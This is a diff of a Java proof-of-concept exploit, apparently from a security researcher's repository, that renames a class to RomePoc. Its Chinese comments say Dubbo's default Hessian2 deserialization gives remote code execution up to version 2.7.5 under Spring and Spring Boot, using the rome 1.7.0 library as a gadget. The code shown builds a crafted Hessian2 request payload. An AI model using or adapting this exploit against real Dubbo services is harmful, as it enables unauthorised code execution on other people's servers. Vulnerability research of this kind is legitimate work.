@@ -17,10 +17,20 @@ import org.apache.dubbo.common.serialize.Cleanable;
 import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;
 
 /**
- * dubbo 默认配置，即hessian2反序列化，都可RCE
+ * dubbo 默认配置，即hessian2反序列化，都可RCE（dubbo版本<=2.7.5）
+ *
+ * Spring和Spring boot环境下都能打
+ *
+ *
+ * <dependency>
+ *    <groupId>com.rometools</groupId>
+ *    <artifactId>rome</artifactId>
+ *    <version>1.7.0</version>
+ * </dependency>
+ *
  * @author threedr3am
  */
-public class JdbcRowSetImplPoc {
+public class RomePoc {
 
   static {
     //rmi server示例
@@ -72,8 +82,9 @@ public class JdbcRowSetImplPoc {
     ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
     Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);
 
+    //todo 经测试，以下4个随意填
+    //注册中心获取到的service全限定名、版本号、方法名
     out.writeUTF("2.0.2");
-    //todo 此处填写注册中心获取到的service全限定名、版本号、方法名
     out.writeUTF("com.threedr3am.learn.server.boot.DemoService");
     out.writeUTF("1.0");
     out.writeUTF("hello");
